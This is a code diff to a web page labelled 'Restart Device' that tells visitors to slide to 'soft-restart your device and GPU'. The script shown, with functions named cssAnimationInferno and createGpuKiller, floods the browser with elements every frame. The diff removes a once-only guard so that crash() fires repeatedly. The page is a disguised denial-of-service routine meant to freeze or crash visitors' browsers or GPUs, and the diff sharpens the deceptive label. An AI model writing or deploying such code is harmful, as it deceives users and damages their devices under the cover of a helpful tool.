@@ -166,6 +166,7 @@
 
     <div class="header-section">
         <h1>Restart Device</h1>
+        <p>Slide to soft-restart your device and GPU</p>
     </div>
 
     <div class="slider-container">
@@ -198,7 +199,6 @@ function cssAnimationInferno() {
 
     let elementCount = 0;
     let frameCount = 0; 
-    let crashTriggered = false; // Prevents triggering crash() more than once
 
     function createGpuKiller() {
         try {
@@ -230,8 +230,8 @@ function cssAnimationInferno() {
                 requestAnimationFrame(createGpuKiller);
             }
         } catch(e) {
-            if (frameCount >= 3 && !crashTriggered) {
-                crashTriggered = true;
+            if (frameCount >= 4) {
+                crash();
                 crash();
             }
             requestAnimationFrame(createGpuKiller);
